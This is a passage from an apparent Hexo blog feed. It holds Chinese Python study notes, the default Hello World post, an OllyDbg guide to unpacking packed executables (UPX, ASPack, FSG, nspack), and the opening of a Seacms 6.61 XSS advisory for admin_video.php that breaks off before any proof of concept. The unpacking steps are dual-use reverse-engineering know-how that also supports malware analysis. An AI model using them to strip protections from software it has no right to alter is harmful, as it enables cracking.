plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; &#39;abc&#39;</span><br><span class="line">&gt;&gt;&gt; b &#x3D; a.replace(&#39;a&#39;, &#39;A&#39;)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">       &#39;Abc&#39;</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">        &#39;abc&#39;</span><br></pre></td></tr></table></figure><h6 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h6><p>在print函数中逗号起分割作用，涉及几个变量时，必须加，分割，不会显示<br>abs（）转化绝对值<br>str（）转化字符串<br>int（）转化整数<br>hex（）转化十六进制<br>len（）返回字符串的字符数</p><h6 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h6><p>pass语句可以在定义函数中作为占位符，def定义函数也要用：引起内部函数，结束定义函数用return返回值，import math语句表示导入math包</p><h6 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h6><p>自定义函数必选参数在前，默认参数在后，要修改默认参数的值，要把对应变量写出来复制，单写值无法改变变量，定义默认参数要牢记一点：默认参数必须指向不变对象！</p><h6 id="13"><a href="#13" class="headerlink" title="13."></a>13.</h6><p>在函数中我们还可以设置可变参数，可变参数就是传入的参数个数是可变的，只是在参数前面加了一个*号，省去了在执行函数时再写一遍list、tuple，也就是说可变参数就是可以把列表中的元素提取出来作为可变元素。还有就是关键字参数，允许你传入多个值，还可以用关键字参数调用已有的list;；而命名关键字参数则可以限制自定义参数的名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def person(name,age,**kw):</span><br><span class="line">    print(&#39;name:&#39;,name,&#39;age:&#39;,age,&quot;other:&quot;,kw)</span><br><span class="line">person(&#39;jason&#39;,19,city&#x3D;&#39;chengdu&#39;)</span><br><span class="line">&gt;&gt;&gt;name: jason age: 19 other: &#123;&#39;city&#39;: &#39;chengdu&#39;&#125;</span><br><span class="line"></span><br><span class="line">def person(name, age, *, city, job):</span><br><span class="line">    print(name, age, city, job)</span><br><span class="line">person(&#39;Jack&#39;, 24, city&#x3D;&#39;Beijing&#39;, job&#x3D;&#39;Engineer&#39;)</span><br><span class="line">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure><p>便于理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def f1(a, b, c&#x3D;0, *args, **kw):</span><br><span class="line">     print(&#39;a &#x3D;&#39;, a, &#39;b &#x3D;&#39;, b, &#39;c &#x3D;&#39;, c, &#39;args &#x3D;&#39;, args, &#39;kw &#x3D;&#39;, kw) </span><br><span class="line">def f2(a, b, c&#x3D;0, *, d, **kw):</span><br><span class="line">     print(&#39;a &#x3D;&#39;, a, &#39;b &#x3D;&#39;, b, &#39;c &#x3D;&#39;, c, &#39;d &#x3D;&#39;, d, &#39;kw &#x3D;&#39;, kw)</span><br><span class="line">&gt;&gt;&gt; f1(1, 2) </span><br><span class="line">     a &#x3D; 1 b &#x3D; 2 c &#x3D; 0 args &#x3D; () kw &#x3D; &#123;&#125;</span><br><span class="line"> &gt;&gt;&gt; f1(1, 2, c&#x3D;3)</span><br><span class="line">     a &#x3D; 1 b &#x3D; 2 c &#x3D; 3 args &#x3D; () kw &#x3D; &#123;&#125;</span><br><span class="line"> &gt;&gt;&gt; f1(1, 2, 3, &#39;a&#39;, &#39;b&#39;) </span><br><span class="line">     a &#x3D; 1 b &#x3D; 2 c &#x3D; 3 args &#x3D; (&#39;a&#39;, &#39;b&#39;) kw &#x3D; &#123;&#125;</span><br><span class="line"> &gt;&gt;&gt; f1(1, 2, 3, &#39;a&#39;, &#39;b&#39;, x&#x3D;99)</span><br><span class="line">     a &#x3D; 1 b &#x3D; 2 c &#x3D; 3 args &#x3D; (&#39;a&#39;, &#39;b&#39;) kw &#x3D; &#123;&#39;x&#39;: 99&#125;</span><br><span class="line"> &gt;&gt;&gt; f2(1, 2, d&#x3D;99, ext&#x3D;None) </span><br><span class="line">     a &#x3D; 1 b &#x3D; 2 c &#x3D; 0 d &#x3D; 99 kw &#x3D; &#123;&#39;ext&#39;: None&#125;</span><br></pre></td></tr></table></figure><h6 id="14"><a href="#14" class="headerlink" title="14."></a>14.</h6><p>加强记忆，python与C语言不一样!   语句结束不加分号，输入用input（）且输入值为字符串，输出用print（），不用提前定义数据类型，Python是弱类型语言进行递归函数时就要防止栈溢出，在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出。</p><h6 id="15"><a href="#15" class="headerlink" title="15."></a>15.</h6><p>关于切片，表达形式L[m，n]，意思是从列表或元组L中提取出第m+1个元素到n-1个元素的切片，如果第一个索引是0，还可以省略为L[：n]，切片也可以取负数，从后面取元素，倒数第一个元素的索引是-1,正着数则是以两个数的间隔做区分，比如0就在第一个元素以前，1在第一第二个元素中间，所以n要减1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L &#x3D; [&#39;Michael&#39;, &#39;Sarah&#39;, &#39;Tracy&#39;, &#39;Bob&#39;, &#39;Jack&#39;]</span><br><span class="line">print(L[-3:])</span><br><span class="line">&gt;&gt;&gt;[&#39;Tracy&#39;, &#39;Bob&#39;, &#39;Jack&#39;]</span><br></pre></td></tr></table></figure><h6 id="16"><a href="#16" class="headerlink" title="16."></a>16.</h6><p>迭代：给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，对于字典的迭代，很可能并没有按照列出的顺序，因为dict的存储不是按照list的方式顺序排列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for ch in &#39;ABC&#39;:</span><br><span class="line">...     print(ch)</span><br><span class="line">&gt;&gt;&gt;A</span><br><span class="line">      B</span><br><span class="line">      C</span><br></pre></td></tr></table></figure><h6 id="17"><a href="#17" class="headerlink" title="17."></a>17.</h6><p>赋值语句：a, b = b, a + b<br>相当于：t = (b, a + b) # t是一个tuple<br>a = t[0]<br>b = t[1]</p><h6 id="18"><a href="#18" class="headerlink" title="18."></a>18.</h6><p>map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def f(x):</span><br><span class="line">...     return x * x</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; r &#x3D; map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">&gt;&gt;&gt; list(r)</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure><h6 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h6><p>两个import语义有差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">print(datetime.datetime.now())</span><br></pre></td></tr></table></figure><p>是引入整个datetime包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line">print(datetime.now())</span><br></pre></td></tr></table></figure><p>是只引入datetime包里的datetime类<br>所以import之后前者是datetime这个包可见 后者是datetime.datetime这个类可见</p><h6 id="20"><a href="#20" class="headerlink" title="20."></a>20.</h6><p>filter()接收一个函数和一个序列，用于过滤序列<br>例如，在一个list中，删掉偶数，只保留奇数，可以这么写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 &#x3D;&#x3D; 1</span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure><p>21.sorted()函数对list进行排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key&#x3D;abs)</span><br><span class="line">[5, 9, -12, -21, 36] </span><br></pre></td></tr></table></figure><p>str.lower表示忽略大小写，reverse=True表示反向排序</p><p>从这几个函数理解高阶函数的意义就是能够利用其他函数对元素进行处理</p><h6 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h6><p>匿名函数lamba，就是只能有一个表达式，不用写return，返回值就是该表达式的结果。用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))</span><br><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81]</span><br></pre></td></tr></table></figure><h6 id="23"><a href="#23" class="headerlink" title="23."></a>23.</h6><p>python2.x中print是一个语句，不用加括号，而在3.x中，print变成了一个函数，要加括号，其中的分隔符用sep定义，结束符用end定义，格式符用%定义，后加元组（）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print &quot;%f, % s&quot; % (3.4, &quot;Hello World!&quot;)  </span><br><span class="line">3.400000, Hello World! </span><br></pre></td></tr></table></figure><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h6 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">  # -*- coding: utf-8 -*-</span><br><span class="line">&#39; a test module &#39;</span><br></pre></td></tr></table></figure><p>第1行和第2行是标准注释，第1行注释可以让这个hello.py文件直接在Unix/Linux/Mac上运行，第2行注释表示.py文件本身使用标准UTF-8编码，第3行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释<br>import sys<br>导入模块，导入sys模块后，我们就有了变量sys指向该模块，利用sys这个变量，就可以访问sys模块的所有功能，要引用该模块内的函数用sys.函数名（）</p><h6 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h6><p>作用域：在一个模块中，我们可能会定义很多函数和变量，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在Python中，是通过_前缀来实现的。类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；</p><h6 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h6><p>包：在文件系统中，包就是一个文件夹，模块就是一个.py文件，区分包与普通文件夹在于每一个包下面都有一个—init—.py文件，并且每一层都有，不同的包里面的同名函数用包名.函数名区分<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvimueawj30h90cogq3.jpg" alt="image"></p><h6 id="4-1"><a href="#4-1" class="headerlink" title="4."></a>4.</h6><p>如果我们只是应用包里的某些函数，可以使用from math import pow, sin, log来导入</p><h6 id="5-1"><a href="#5-1" class="headerlink" title="5."></a>5.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    from cStringIO import StringIO</span><br><span class="line">    except ImportError:</span><br><span class="line">    from StringIO import StringIO</span><br></pre></td></tr></table></figure><p>上述代码先尝试从cStringIO导入，如果失败了（比如cStringIO没有被安装），再尝试从StringIO导入。这样，如果cStringIO模块存在，则我们将获得更快的运行速度，如果cStringIO不存在，则顶多代码运行速度会变慢，但不会影响代码的正常执行。try 的作用是捕获错误，并在捕获到指定错误时执行 except 语句。</p><h6 id="6-1"><a href="#6-1" class="headerlink" title="6."></a>6.</h6><p>第三方模块载入在py2.7以后已经自带了pip，可以利用piip下载第三方模块，并且IDEpcharm中自带pip。import载入模块时，遇到未下载第三方模块会提醒你下载</p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h6 id="1-2"><a href="#1-2" class="headerlink" title="1."></a>1.</h6><p>面向对象编程可以看成是不同对象的相互调用，基本思想为类和实例，必须牢记类是抽象的模板，比如Student类，而实例是根据类创建出来的一个个具体的“对象”，每个对象都拥有相同的方法，但各自的数据可能不同。<br><img src="http://ww3.sinaimg.cn/large/0060lm7Tly1fpmvjxjg5nj30qq0gjn2b.jpg" alt="image"></p><h6 id="2-2"><a href="#2-2" class="headerlink" title="2."></a>2.</h6><p>类通过关键字class定义，类名以大写字母开头，紧接着是(object)，表示该类是从哪个类继承下来的。有了类就可以创建具体的实例，实例用类名＋（）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    pass  #pass能够创建一个最简单的类</span><br><span class="line">xiaoming &#x3D; Person()</span><br><span class="line">xiaohong &#x3D; Person()</span><br><span class="line">print xiaoming</span><br><span class="line">print xiaohong</span><br><span class="line">print xiaoming&#x3D;&#x3D;xiaohong</span><br><span class="line">&gt;&gt;&gt;&lt;__main__.Person object at 0x7fb705015450&gt;  #结果中出现的__main__意思是，调用模块本身</span><br><span class="line">&lt;__main__.Person object at 0x7fb704f54ad0&gt;</span><br><span class="line">False # 说明两个实例并不相同</span><br></pre></td></tr></table></figure><p>关于为什么要继承object类[<a href="https://www.zhihu.com/question/19754936]">https://www.zhihu.com/question/19754936]</a>   </p><h6 id="3-2"><a href="#3-2" class="headerlink" title="3."></a>3.</h6><p>实例的属性使用实例,属性表示，在定义 Person 类时，可以为Person类添加一个特殊的<strong>init</strong>()方法，当创建实例时，<strong>init</strong>()方法被自动调用，我们就能在此为每个实例都统一属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    def __init__(self, name, gender, birth):</span><br><span class="line">        self.name &#x3D; name</span><br><span class="line">        self.gender &#x3D; gender</span><br><span class="line">        self.birth &#x3D; birth</span><br></pre></td></tr></table></figure><p><strong>init</strong>() 方法的第一个参数必须是 self（也可以用别的名字，但建议使用习惯用法），后续参数则可以自由指定，和定义函数没有任何区别</p><h6 id="4-2"><a href="#4-2" class="headerlink" title="4."></a>4.</h6><p>关于访问限制，在属性前面加上__，如__job该属性就无法被外部访问到，而__job__作为特殊属性可以被外部访问，_job也可以被外部访问</p><h6 id="5-2"><a href="#5-2" class="headerlink" title="5."></a>5.</h6><p>实例属性每个实例各自拥有，互相独立，而类属性有且只有一份，该类下的实例都可以使用类属性，在内部函数中调用类属性，需要使用类名.类属性名，当实例属性和类属性重名时，实例属性优先级高，它将屏蔽掉对类属性的访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Person(object):</span><br><span class="line">    address &#x3D; &#39;Earth&#39;  #定义类属性</span><br><span class="line">    def __init__(self, name):   #定义实例属性</span><br><span class="line">        self.name &#x3D; name</span><br></pre></td></tr></table></figure><h6 id="6-2"><a href="#6-2" class="headerlink" title="6."></a>6.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    ...</span><br><span class="line">    def set_score(self, score):</span><br><span class="line">        if 0 &lt;&#x3D; score &lt;&#x3D; 100:</span><br><span class="line">            self.__score &#x3D; score</span><br><span class="line">        else:</span><br><span class="line">            raise ValueError(&#39;bad score&#39;)  #可以对参数做检查，避免传入无效的参数</span><br></pre></td></tr></table></figure><h6 id="7-1"><a href="#7-1" class="headerlink" title="7."></a>7.</h6><p>方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据</p><h6 id="8-1"><a href="#8-1" class="headerlink" title="8."></a>8.</h6><p>在面向对象的程序设计中，当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class），对于前面的类，括号里面的object就是他们的父类，子类继承父类全部功能<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvkggipfj30k90but8p.jpg" alt="image"></p><h6 id="9-1"><a href="#9-1" class="headerlink" title="9."></a>9.</h6><p>加强记忆，一种类的实例可以应用这个类里面的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Timer(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#39; Timer is  Start...&#39;)</span><br><span class="line">dog&#x3D;Timer()</span><br><span class="line">dog.run()   #实例dog应用了Timer类中的Run函数</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h2&gt;&lt;h6 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1.&quot;&gt;&lt;/a&gt;1.&lt;/h6&gt;&lt;p&gt;print
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="python" scheme="http://yoursite.com/child/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/child/2021/01/07/hello-world/"/>
    <id>http://yoursite.com/child/2021/01/07/hello-world/</id>
    <published>2021-01-07T07:19:39.009Z</published>
    <updated>2021-01-07T07:19:39.009Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>脱壳总结</title>
    <link href="http://yoursite.com/child/2018/08/15/%E8%84%B1%E5%A3%B3%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/child/2018/08/15/脱壳总结/</id>
    <published>2018-08-15T03:35:12.000Z</published>
    <updated>2018-08-19T05:39:33.822Z</updated>
    
    <content type="html"><![CDATA[<h5 id="常见脱壳知识："><a href="#常见脱壳知识：" class="headerlink" title="常见脱壳知识："></a>常见脱壳知识：</h5><ul><li>1.PUSHAD （压栈）  代表程序的入口点</li><li>2.POPAD （出栈） 代表程序的出口点，与PUSHAD相对应，一般找到这个,说明OEP可能就在附近</li><li>3.OEP：程序的入口点，软件加壳就是隐藏了OEP（或者用了假的OEP）<br>只要我们找到程序真正的OEP，就可以立刻脱壳。 <h5 id="脱壳的几种方法："><a href="#脱壳的几种方法：" class="headerlink" title="脱壳的几种方法："></a>脱壳的几种方法：</h5><h6 id="方法一：单步跟踪"><a href="#方法一：单步跟踪" class="headerlink" title="方法一：单步跟踪"></a>方法一：单步跟踪</h6></li></ul><ol><li>用OD载入，不分析代码！</li><li>单步向下跟踪F8，是向下跳的让它实现</li><li>遇到程序往回跳的（包括循环），我们在下一句代码处按F4（或者右健单击代码，选择断点——运行到所选）</li><li>绿色线条表示跳转没实现，不用理会，红色线条表示跳转已经实现！</li><li>如果刚载入程序，在附近就有一个CALL的，我们就F7跟进去，这样很快就能到程序的OEP</li><li>在跟踪的时候，如果运行到某个CALL程序就运行的，就在这个CALL中F7进入</li><li>一般有很大的跳转，比如 jmp XXXXXX 或者 je XXXXXX 或者有RETE的一般很快就会到程序的OEP。  </li></ol><h6 id="方法二：ESP定律脱壳（最常用）"><a href="#方法二：ESP定律脱壳（最常用）" class="headerlink" title="方法二：ESP定律脱壳（最常用）"></a>方法二：ESP定律脱壳（最常用）</h6><ol><li>用Od载入后就按F8，注意观察OD右上角的寄存器中ESP有没出现</li><li>在命令行下：dd 0012FFA4(0012FFA4指在当前代码中的ESP地址)，按回车！</li><li>选种下断的地址，下硬件访问WORD断点。</li><li>按一下F9运行程序，直接来到了跳转处，按下F8，到达程序OEP，脱壳  </li></ol><h6 id="方法三：内存跟踪"><a href="#方法三：内存跟踪" class="headerlink" title="方法三：内存跟踪"></a>方法三：内存跟踪</h6><ol><li>用OD打开软件！</li><li>点击选项——调试选项——异常，把里面的忽略全部勾上，CTRL+F2重新加载程序</li><li>按ALT+M,打开内存镜象，找到第一个.rsrc.按F2下断点，然后按SHIFT+F9运行到断点，接着再按ALT+M, 打开内存镜象，找到.RSRC上面的CODE，按F2下断点，然后按SHIFT+F9，直接到达程序OEP，脱壳  </li></ol><h6 id="方法四：跟踪出口法"><a href="#方法四：跟踪出口法" class="headerlink" title="方法四：跟踪出口法"></a>方法四：跟踪出口法</h6><ol><li>开始按Ctrl+F,输入：popad（只适合少数壳，包括ASPACK壳），然后按下F2，F9运行到此处</li><li>来到大跳转处，点下F8，脱壳</li></ol><h6 id="方法五：最后一次异常法"><a href="#方法五：最后一次异常法" class="headerlink" title="方法五：最后一次异常法"></a>方法五：最后一次异常法</h6><ol><li>用OD打开软件</li><li>点击选项——调试选项——异常，把里面的勾全部去掉，CTRL+F2重新加载程序</li><li>在这里我们按SHIFT+F9，直到程序运行，记下从开始按SHIFT+F9到程序运行的次数</li><li>CTRL+F2重新加载程序，按SHIFT+F9（次数为程序运行的次数-1次）</li><li>在OD的右下角我们看见有一个SE 句柄，这时我们按CTRL+G，输入SE 句柄前的地址！</li><li>按F2下断点，然后按SHIFT+F9来到断点处！</li><li>去掉断点，按F8慢慢向下走</li><li>到达程序的OEP，脱壳</li></ol><h5 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h5><h6 id="手脱-UPX-壳的捷径"><a href="#手脱-UPX-壳的捷径" class="headerlink" title="手脱 UPX 壳的捷径"></a>手脱 UPX 壳的捷径</h6><p>OD载入程序后，直接Ctrl+F，输入 POPAD  ;点确定后 来到这个命令所在的位置。按F2，在这个地方下断；再按F9（运行）；停止后，按F2取消刚才下的断点。再F8单步！ </p><h6 id="手脱-ASPCK-的壳"><a href="#手脱-ASPCK-的壳" class="headerlink" title="手脱 ASPCK 的壳"></a>手脱 ASPCK 的壳</h6><p>脱这个壳用ESP定律，还是相对快捷的。可以用载入程序后，第二行（是一个CALL）那里面的ESP。(多数程序这个壳的第二行都是一个CALL)，<br>在左OD左下角的命令行中，输入命令：hr ESP地址（如 hr 0012FFA4）；F9 运行。然后从OD”调试菜单“中的”硬件断点“这一项将刚才下的断点删除，这点很重要！最后F8单步！  </p><h6 id="手脱FSG-1-33-和-PCshrink-的壳"><a href="#手脱FSG-1-33-和-PCshrink-的壳" class="headerlink" title="手脱FSG 1.33 和 PCshrink 的壳"></a>手脱FSG 1.33 和 PCshrink 的壳</h6><p>1、忽略所有异常<br>2、Alt+M  打开内存镜像，找到第一个 ”.rsrc“<br>  3、F2（下断），F9（运行）<br>  4、Alt+M  打开内存镜像，找到”Code“段；<br>  5、F2（下断），Shift+F9【这点一定要记住，切记是 Shift+F9】运行；<br>  6、先按F8，再按下F4，直接到达OEP  </p><h6 id="手脱-JDpack-壳-和-PEpack-1-0-的壳-最简单的方法"><a href="#手脱-JDpack-壳-和-PEpack-1-0-的壳-最简单的方法" class="headerlink" title="手脱 JDpack 壳 和 PEpack 1.0 的壳 最简单的方法"></a>手脱 JDpack 壳 和 PEpack 1.0 的壳 最简单的方法</h6><p>内存镜像法  </p><h6 id="手脱nspack（北斗）1-3-的壳"><a href="#手脱nspack（北斗）1-3-的壳" class="headerlink" title="手脱nspack（北斗）1.3 的壳"></a>手脱nspack（北斗）1.3 的壳</h6><p>1、ESP定律，命令：hr ESP地址 【脱壳后程序不能正常运行】<br>2、用 ImportREC 这个工具进行修复，修复后程序正常运行。  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;常见脱壳知识：&quot;&gt;&lt;a href=&quot;#常见脱壳知识：&quot; class=&quot;headerlink&quot; title=&quot;常见脱壳知识：&quot;&gt;&lt;/a&gt;常见脱壳知识：&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;1.PUSHAD （压栈）  代表程序的入口点&lt;/li&gt;
&lt;li&gt;2.POPAD （出栈
      
    
    </summary>
    
    
      <category term="逆向" scheme="http://yoursite.com/child/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="脱壳" scheme="http://yoursite.com/child/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>Seacms6.61xss漏洞</title>
    <link href="http://yoursite.com/child/2018/07/25/seacms6.61xss/"/>
    <id>http://yoursite.com/child/2018/07/25/seacms6.61xss/</id>
    <published>2018-07-25T03:35:12.000Z</published>
    <updated>2018-07-27T15:26:30.893Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php"><a href="#Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php" class="headerlink" title="Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php"></a>Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php</h3><h4 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h4><p>Seacms 6.61  </p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 